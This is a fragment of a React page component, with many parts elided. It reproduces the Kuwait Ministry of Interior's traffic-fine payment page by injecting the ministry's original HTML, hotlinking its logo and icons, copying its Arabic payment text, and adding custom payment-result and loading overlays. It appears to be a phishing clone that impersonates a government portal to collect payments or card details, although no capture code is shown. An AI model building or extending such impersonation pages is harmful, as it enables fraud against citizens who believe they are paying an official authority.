...
export default function Home() {
  ...
  useEffect(() => {
    // Logic to bind our system to the HTML elements
  ...
  return (
    <div className="moi-final-fix" dir="rtl">
      <style>{`
        .moi-final-fix { min-height: 100vh; background-color: #e9e6de; }
        .results-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 99999; }
        .results-modal { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); width: 90%; max-width: 450px; text-align: center; border: 4px solid #000576; }
        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 100000; }
      `}</style>

      {/* INJECT ORIGINAL MOI HTML SOURCE DIRECTLY */}
      <div dangerouslySetInnerHTML={{ __html: `
        ...
        <div class="container" style="background-image: url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png'); background-repeat: repeat; min-height: 100vh;">
          <header>
            <div class="row pt-4">
              <div class="col-4 col-md-2 text-center">
                <a class="navbar-brand m-0" href="#"><img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 120px;"></a>
              </div>
          ...
          <nav class="navbar navbar-expand-lg navbar-dark border-bottom box-shadow mt-4" style="background-color: #000576;">
            <div class="container">
          ...
          <div class="row mt-4">
            ...
            <div class="col-lg-9">
              <div class="card p-4 shadow-sm" style="border-radius: 0; border: none; background: rgba(255,255,255,0.85);">
                ...
                <p class="text-center mt-4 font-weight-bold" style="color: #333; font-size: 15px;">
                  بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                </p>

                <div class="d-flex justify-content-center mt-3">
                  <span class="badge badge-success p-2 mx-2" style="font-size: 13px;">قابلة للدفع الكترونياً</span>
                  <span class="badge badge-danger p-2 mx-2" style="font-size: 13px;">غير قابلة للدفع الكترونياً</span>
                </div>
              </div>

              <!-- Mobile specific icons matching user screenshots -->
              <div class="d-lg-none mt-5">
                <div class="row text-center">
                  <div class="col-6 mb-4">
                    <div class="bg-white rounded-circle shadow mx-auto d-flex align-items-center justify-content-center" style="width: 110px; height: 110px; border: 5px solid #000576;">
                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 60px;">
                    </div>
                    <p class="mt-2 font-weight-bold" style="color: #000576;">دفع المخالفات</p>
                  </div>
                  <div class="col-6 mb-4">
                    <div class="bg-white rounded-circle shadow mx-auto d-flex align-items-center justify-content-center" style="width: 110px; height: 110px; border: 5px solid #000576;">
                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg" style="width: 60px;">
                    </div>
                    <p class="mt-2 font-weight-bold" style="color: #000576;">سير القضية</p>
                  </div>
                </div>
              </div>
            </div>
